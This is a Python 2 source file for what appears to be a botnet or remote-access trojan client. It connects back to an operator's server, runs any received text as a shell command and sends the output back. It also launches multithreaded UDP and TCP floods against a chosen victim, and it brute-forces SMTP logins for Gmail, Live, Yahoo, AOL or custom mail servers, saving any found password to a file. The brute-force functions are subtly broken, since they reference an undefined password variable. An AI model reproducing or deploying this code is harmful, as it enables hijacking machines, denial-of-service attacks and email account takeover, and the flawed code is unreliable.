#!/usr/bin/env python2

import subprocess, os, sys, time, threading, signal, smtplib
from socket import *
from threading import Thread

if (len(sys.argv) == 3):
	host = sys.argv[1]
	port = int(sys.argv[2])
else:
	sys.exit("Usage: client.py <server ip> <server port>")

#Used to make sure a subprocess lasts 30 seconds max-->
class Alarm(Exception):
    pass

def alarm_handler(signum, frame):
    raise Alarm
#<--

#Used by the Bruteforcer-->
def product(*args, **kwds):
    pools = map(tuple, args) * kwds.get('repeat', 1)
    result = [[]]
    for pool in pools:
        result = [x+[y] for x in result for y in pool]
    for prod in result:
        yield tuple(prod)

def repeat(object, times=None):
    if times is None:
        while True:
            yield object
    else:
        for i in xrange(times):
            yield object
#<--

def savePass(password):
	f = open("password.txt", "w")
	f.write(password)
	f.close()

def gmailbruteforce(email, combination, minimum, maximum):
	smtpserver = smtplib.SMTP("smtp.gmail.com",587)
	smtpserver.starttls()
	smtpserver.ehlo()

	found = False

	for n in range(minimum, maximum+1):
		if (found == False):
        		for w in product(combination,repeat=n):
            			word = ''.join(w)
            			try:
					smtpserver.login(email, password)
				except(smtplib.SMTPAuthenticationError), msg:
					if "Please Log" in str(msg):
						savePass(password)
						found = True
						break
		else:
			break

def custombruteforce(address, port, email, combination, minimum, maximum):
	smtpserver = smtplib.SMTP(address,int(port))
	smtpserver.starttls()
	smtpserver.ehlo()

	found = False

	for n in range(minimum, maximum+1):
		if (found == False):
        		for w in product(combination,repeat=n):
            			word = ''.join(w)
            			try:
					smtpserver.login(email, password)
					savePass(password)
					found = True
					break
				except:
					pass
		else:
			break

class udpFlood(threading.Thread):
    def __init__ (self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
	self.victimport = victimport

    def run(self):
	timeout = time.time() + 60
        while True:
 		test = 0
    		if (time.time() <= timeout):
			s = socket(AF_INET, SOCK_DGRAM)
			s.connect((self.victimip, int(self.victimport)))
			s.send('A' * 65000)        
		else:
			break

class tcpFlood(threading.Thread):
    def __init__ (self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
	self.victimport = victimport

    def run(self):
	timeout = time.time() + 60
        while True:
 		test = 0
    		if (time.time() <= timeout):
			s = socket(AF_INET, SOCK_STREAM)
			s.settimeout(1)
			s.connect((self.victimip, int(self.victimport)))
			s.send('A' * 65000)       
		else:
			break

def udpUnleach(victimip, victimport):
	threads = []
	for i in range(1, 21):
    		thread = udpFlood(victimip, victimport)
    		thread.start()
   		threads.append(thread)
 
	for thread in threads:
    		thread.join()

def tcpUnleach(victimip, victimport):
	threads = []
	for i in range(1, 21):
    		thread = tcpFlood(victimip, victimport)
    		thread.start()
   		threads.append(thread)
 
	for thread in threads:
    		thread.join()

def main(host, port):
	while 1:
		connected = False
		while 1:
			while (connected == False):
				try:
					s=socket(AF_INET, SOCK_STREAM)
					s.connect((host,port))
					print "[INFO] Connected"
					connected = True
				except:
					time.sleep(5)

			try:
				msg=s.recv(20480)
				if ("cd " in msg):
					msg = msg.replace("cd ","")
					os.chdir(msg)
					s.send(os.getcwd())
					print "[INFO] Changed dir to %s" % os.getcwd()
				elif ("udpflood " in msg):
					msg = msg.replace("udpflood ", "")
					seperator = msg.index(":")
					try:
						t = Thread(None,udpUnleach,None,(msg[:seperator], msg[seperator+1:]))
        					t.start()
						s.send("[CLIENT] Flooding started\n")
					except:
						s.send("[CLIENT] Failed to start Flooding\n")
						pass
				elif ("udpfloodall " in msg):
					msg = msg.replace("udpfloodall ", "")
					seperator = msg.index(":")
					try:
						t = Thread(None,udpUnleach,None,(msg[:seperator], msg[seperator+1:]))
        					t.start()
					except:
						pass
				elif ("tcpflood " in msg):
					msg = msg.replace("tcpflood ", "")
					seperator = msg.index(":")
					try:
						t = Thread(None,tcpUnleach,None,(msg[:seperator], msg[seperator+1:]))
        					t.start()
						s.send("[INFO] Flooding started\n")
					except:
						s.send("[ERROR] Failed to start Flooding\n")
						pass
				elif ("tcpfloodall " in msg):
					msg = msg.replace("tcpfloodall ", "")
					seperator = msg.index(":")
					try:
						t = Thread(None,tcpUnleach,None,(msg[:seperator], msg[seperator+1:]))
        					t.start()
					except:
						pass
				elif ("gmailbruteforce " in msg):
					msg = msg.replace("gmailbruteforce ", "")
					try:
						email, combination, minimum, maximum = msg.split(":")
						t = Thread(None,gmailbruteforce,None,(email, combination, minimum, maximum))
        					t.start()
						s.send("[CLIENT] Bruteforcing started\n")
					except:
						s.send("[CLIENT] Wrong arguments\n")
				elif ("livebruteforce " in msg):
					msg = msg.replace("livebruteforce ", "")
					try:
						email, combination, minimum, maximum = msg.split(":")
						t = Thread(None,custombruteforce,None,("smtp.live.com", 587, email, combination, minimum, maximum))
        					t.start()
						s.send("[CLIENT] Bruteforcing started\n")				
					except:
						s.send("[CLIENT] Wrong arguments\n")
				elif ("yahoobruteforce " in msg):
					msg = msg.replace("yahoobruteforce ", "")
					try:
						email, combination, minimum, maximum = msg.split(":")
						t = Thread(None,custombruteforce,None,("smtp.mail.yahoo.com", 587, email, combination, minimum, maximum))
        					t.start()
						s.send("[CLIENT] Bruteforcing started\n")				
					except:
						s.send("[CLIENT] Wrong arguments\n")
				elif ("aolbruteforce " in msg):
					msg = msg.replace("aolbruteforce ", "")
					try:
						email, combination, minimum, maximum = msg.split(":")
						t = Thread(None,custombruteforce,None,("smtp.aol.com", 587, email, combination, minimum, maximum))
        					t.start()
						s.send("[CLIENT] Bruteforcing started\n")				
					except:
						s.send("[CLIENT] Wrong arguments\n")
				elif ("custombruteforce " in msg):
					msg = msg.replace("custombruteforce ", "")
					try:
						address, port, email, combination, minimum, maximum = msg.split(":")
						t = Thread(None,custombruteforce,None,(address, port, email, combination, minimum, maximum))
        					t.start()
						s.send("[CLIENT] Bruteforcing started\n")				
					except:
						s.send("[CLIENT] Wrong arguments\n")
				elif (msg == "hellows123"):
					s.send(os.getcwd())
				elif (msg == "quit"):
					s.close()
					print "[INFO] Connection Closed"
					break
				else:
					comm = subprocess.Popen(str(msg), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					signal.signal(signal.SIGALRM, alarm_handler)
					signal.alarm(30)
					try:
    						STDOUT, STDERR = comm.communicate()
						en_STDERR = bytearray(STDERR)
						en_STDOUT = bytearray(STDOUT)
						if (en_STDERR == ""):
							if (en_STDOUT != ""):
								print en_STDOUT
								s.send(en_STDOUT)
							else:
								s.send("[CLIENT] Command Executed")
						else:
							print en_STDERR
							s.send(en_STDERR)
					except Alarm:
						comm.terminate()
						comm.kill()
    						s.send("[CLIENT] 30 Seconds Exceeded - SubProcess Killed\n")				
					signal.alarm(0)
			except KeyboardInterrupt:
				s.close()
				print "[INFO] Connection Closed"
				break
			except:
				s.close()
				print "[INFO] Connection Closed"
				break
			
while 1:
	try:
		main(host, port)
	except:
		time.sleep(5)
